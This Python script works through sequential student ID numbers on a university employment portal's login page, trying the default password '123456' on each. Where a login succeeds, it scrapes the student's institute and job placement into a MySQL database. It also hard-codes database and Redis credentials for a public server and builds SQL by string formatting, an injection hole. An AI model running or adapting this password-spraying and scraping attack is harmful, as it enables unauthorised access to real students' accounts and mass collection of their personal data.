import asyncio
import time
import MySQLdb
import requests
import redis
import re

invalid = 0
loop = 12015050101001

pass_word = '123456'

redis_info = {
    'host': '119.23.214.123',
    'password': 'ta',
    'port': 6379,
    'db': 0,
}

mysql_info = {
    'host': "119.23.214.123",
    'password': 'ta',
    'user': 'root',
    'database': 'StudentMsg_development'
}

msg_url = 'http://jiuye.csmu.edu.cn/jy/desktop/index?note=true'
login_url = 'http://jiuye.csmu.edu.cn/jy/login'

headers = {
    'content-type': "application/x-www-form-urlencoded",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
    'Connection': 'close'
}


class DbMysql(object):
    instance = MySQLdb.connect(mysql_info['host'], mysql_info['user'], mysql_info['password'],
                               mysql_info['database'], charset='utf8')
    cursor = instance.cursor()

    @staticmethod
    def Insert(n, t, v):
        sql = """insert users(id, institute, job) value(%s, '%s', '%s');""" % (n, t, v)
        print(sql)
        try:
            DbMysql.cursor.execute(sql)
            DbMysql.instance.commit()
        except:
            DbMysql.instance.rollback()

    @staticmethod
    def Close():
        DbMysql.instance.close()


class DbRedis():
    def __init__(self):
        self.conn = None
        if not hasattr(DbRedis, 'pool'):
            DbRedis.getRedisConn()
        self.conn = redis.Redis(connection_pool=DbRedis.pool)

    @staticmethod
    def getRedisConn():
        DbRedis.pool = redis.ConnectionPool(host=redis_info['host'], password=redis_info['password'],
                                            port=redis_info['port'], db=redis_info['db'])

    """
    string类型 {'key':'value'} redis操作
    """

    def setredis(self, key, value, time=None):
        # 非空即真非0即真
        if time:
            res = self.conn.setex(key, value, time)
        else:
            res = self.conn.set(key, value)
        return res

    def getRedis(self, key):
        res = self.conn.get(key).decode()
        return res

    def delRedis(self, key):
        res = self.conn.delete(key)
        return res

    """
    hash类型，{'name':{'key':'value'}} redis操作
    """

    async def setHashRedis(self, name, key, value):
        res = self.conn.hset(name, key, value)
        return res

    def getHashRedis(self, name, key=None):
        # 判断key是否我为空，不为空，获取指定name内的某个key的value; 为空则获取name对应的所有value
        if key:
            res = self.conn.hget(name, key)
        else:
            res = self.conn.hgetall(name)
        return res

    def delHashRedis(self, name, key=None):
        if key:
            res = self.conn.hdel(name, key)
        else:
            res = self.conn.delete(name)
        return res


def get_job(text: str):
    job = re.search(r'name=\"yxdw1\" value=\"(.*?)\"', text).group()
    job = str.replace(job, 'name="yxdw1" value="', '')
    job = str.replace(job, '"', '')
    return job


def get_institute(text: str):
    institutes = re.search(r'important; \" value=\"(.*?)\"\/\>', text).group()
    institutes = str.replace(institutes, 'important; " value="', '')
    institutes = str.replace(institutes, '"/>', '')
    print(institutes)
    return institutes


def save_db(institute, job):
    global invalid
    # dbredis = DbRedis()
    # dbredis.setHashRedis(str(invalid), 'institute', institute)
    # dbredis.setHashRedis(str(invalid), 'job', job)
    DbMysql.Insert(invalid, institute, job)
    print('save access', invalid)


def parse_html(text: str):
    job = get_job(text)
    institute = get_institute(text)
    save_db(institute, job)


def ispwd(html):
    if re.search(r'密码错误', html) is not None:
        return False
    else:
        return True

def isexist(html: str):
    if re.search(r'账号不存在', html) is not None:
        return False
    else:
        return True


def iserror(html: str):
    if re.search(r'系统错误', html) is not None:
        return False
    else:
        return True


################################
# 12015050301021
# 15年级
# 07专业号
# 01 班级号
# 031 学号
###############################

def start(loop):
    loop_end=loop+100000
    n = 0
    while loop<loop_end:

        user_name = loop
        data = {'user_name': user_name, 'pass_word': pass_word}
        requests.adapters.DEFAULT_RETRIES = 5  # 增加重连次数
        try:
            session = requests.sessions.session()
            session.keep_alive = False
            session.get(login_url)  # get login of cookie
            res = session.request("POST", login_url, data=data, headers=headers)
            if  ispwd(res.text) is not True:
                loop += 1
                continue
            if  isexist(res.text) is True:
                print(loop, '.....................')
                res = session.request("GET", msg_url, headers=headers)
                if  iserror(res.text) is True:
                    parse_html(res.text)
                    loop += 1
                    n += 1
                    continue
                elif n==0:
                    return
                else:
                    loop=loop-loop%1000
                    loop += 1001
            elif n == 0:
                return
            else:
                n+=1
                loop+=1
                if n>10:
                    n=0
                    loop=loop-loop%1000
                    loop+=1001

        except  :
            print("timeout ....")
            time.sleep(2)
            continue


def end():
    DbMysql.Close()


if __name__ == '__main__':
    loops = asyncio.get_event_loop()
    coroutines = [start(12015050101001 + i*100000) for i in range(20)]
    tasks = [asyncio.ensure_future(coroutine) for coroutine in coroutines]
    loops.run_until_complete(asyncio.wait(tasks))
    loops.close()
    end()
